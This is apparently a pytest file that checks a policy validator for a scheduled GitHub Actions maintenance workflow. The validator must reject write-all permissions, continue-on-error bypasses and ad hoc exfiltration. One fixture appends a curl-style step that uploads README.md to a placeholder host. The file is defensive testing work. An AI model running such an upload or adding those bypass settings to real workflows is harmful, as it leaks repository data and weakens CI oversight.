from __future__ import annotations

import copy
from pathlib import Path

from tools.repo_maintenance.checks.check_scheduled_workflow import validate
from tools.repo_maintenance.schemas import load_yaml_text


def _workflow(repo_root: Path):
    return load_yaml_text(
        (repo_root / ".github/workflows/scheduled-maintenance.yml").read_text(encoding="utf-8")
    )


def test_real_scheduled_workflow_satisfies_policy(repo_root: Path) -> None:
    assert validate(_workflow(repo_root)) == []


def test_scheduled_workflow_rejects_permission_and_error_bypasses(repo_root: Path) -> None:
    value = copy.deepcopy(_workflow(repo_root))
    job = value["jobs"]["network-audit"]
    job["permissions"] = "write-all"
    job["steps"][0]["continue-on-error"] = "${{ true }}"
    reasons = [item.reason for item in validate(value)]
    assert any("permissions" in reason for reason in reasons)
    assert any("continue on error" in reason for reason in reasons)


def test_scheduled_workflow_rejects_ad_hoc_exfiltration_commands(repo_root: Path) -> None:
    value = copy.deepcopy(_workflow(repo_root))
    value["jobs"]["network-audit"]["steps"].append(
        {"run": "CURL https://example.test --data-binary @README.md"}
    )
    assert any("forbidden command" in item.reason for item in validate(value))
